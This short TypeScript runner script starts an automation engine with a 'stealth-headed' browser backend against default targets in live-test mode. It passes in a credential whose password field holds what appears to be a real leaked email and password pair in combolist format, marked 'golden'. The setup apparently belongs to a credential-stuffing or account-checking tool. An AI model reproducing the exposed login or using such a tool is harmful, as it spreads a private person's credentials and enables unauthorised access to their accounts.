import { AutomationEngine, type Credential, type EngineConfig, DEFAULT_TARGETS } from './src/core/engine.js';
import { ConfigStore } from './src/core/config-store.js';

async function run() {
  const appConfig = ConfigStore.load();
  
  // Cast config to EngineConfig to satisfy strict typings. 
  // It merges saved config values with the necessary mandatory fields.
  const config = {
    ...appConfig,
    targets: DEFAULT_TARGETS,
    backend: 'stealth-headed',
    concurrency: appConfig.concurrency ?? 1,
    maxRetries: appConfig.maxRetries ?? 0,
    liveTest: true
  } as EngineConfig;
  
  const creds: Credential[] = [{
    email: "joe",
    passwords: ["phuttasopit@hotmail.co.th:Tomo06032553"],
    isGolden: true
  }];

  const engine = new AutomationEngine();
  engine.on("log", (msg) => console.log(msg.message));
  engine.on("screenshot", (data) => console.log("Screenshot:", data.filename));
  
  await engine.start(creds, config);
}
run().catch(console.error);
